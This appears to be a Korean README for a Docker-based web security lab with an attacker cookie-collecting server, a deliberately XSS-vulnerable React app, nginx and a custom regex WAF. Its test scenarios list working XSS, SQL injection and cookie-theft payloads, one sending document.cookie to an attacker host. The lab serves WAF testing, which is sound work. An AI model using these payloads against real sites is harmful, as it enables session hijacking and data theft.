# System_security_report

# 실습 컨테이너 구성 안내

```
┌──────────┐        ┌────────────┐        ┌────────────┐
│  Client  │ ──▶   │  WAF(8080) │ ──▶   │  Nginx      │
└──────────┘        │  ▸ PCRE2   │        │  ▸ 정적 파일│
                    │  ▸ libevent│        │  ▸ 리버스    │
                    └────────────┘        │    프록시   │
                                           └────┬───────┘
                                                ▼
                                     ┌────────────────────┐
                                     │ Frontend(3000)     │
                                     │  ▸ React dev server│
                                     └────────────────────┘

Attacker(4000)은 별도 네트워크 경로로 쿠키를 수집한다.

## 1. attacker_webserver (4000/tcp)
- **기능**: `steal.js` 제공 및 `/collect` 엔드포인트로 피해자 쿠키 수집
- **스택**: Python 3.11 + Flask
- **경로**: `attacker_webserver/`
- **주요 파일**
  | 파일 | 설명 |
  |------|------|
  | `app.py` | `/steal.js`, `/collect` 라우트 구현 |
  | `requirements.txt` | flask 의존성 명시 |
  | `Dockerfile` | 슬림 이미지로 빌드 |

## 2. frontend (3000/tcp)
- **기능**: 취약 React 애플리케이션 (쿼리 파라미터를 그대로 innerHTML 로 렌더링)
- **스택**: Node 18 + CRA(dev server)
- **경로**: `frontend/`
- **특징**: HMR 활성화, 빌드 산출물은 `frontend/project/build`

## 3. nginx (80/tcp)
- **기능**: 정적 빌드 파일 제공 및 백엔드(API) 리버스 프록시 예시 포함
- **경로**: `nginx/`
- **주요 파일**
  | 파일 | 설명 |
  |------|------|
  | `nginx.conf` | 메인 설정 (worker, include) |
  | `conf.d/site.conf` | `location /` 정적 서빙 등 |

## 4. waf_server (8080/tcp)
- **기능**: 리버스 프록시 + Web Application Firewall
- **스택**: C, libevent, PCRE2
- **경로**: `waf_server/`
- **주요 특징**
  1. 요청 헤더·쿼리스트링을 실시간 스트리밍 검사
  2. 다중 정규식(PATTERNS[]) 컴파일 → 순차 매칭
  3. 1회 URL-Decode 후 재검사로 `%3C` 우회 방어
  4. 매칭 시 403 응답 후 세션 종료

## 실행 방법
```bash
docker compose up -d   # 모든 서비스 기동
docker compose logs -f waf | cat  # WAF 차단 로그 실시간 확인
```

## 테스트 시나리오
1. XSS
   ```
   http://localhost:8080/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
   ```
2. SQLi
   ```
   http://localhost:8080/product?id=10%20UNION%20SELECT%20user,pass%20FROM%20users--
   ```
3. 쿠키 탈취
   ```
   http://localhost:8080/?q=%3Cimg%20src%3Dx%20onerror%3D"fetch('http://attacker:4000/collect?c='+document.cookie)"%3E
   ```

각 요청이 403 Forbidden 으로 차단되는지, attacker 로그에 쿠키가 찍히는지 확인한다.
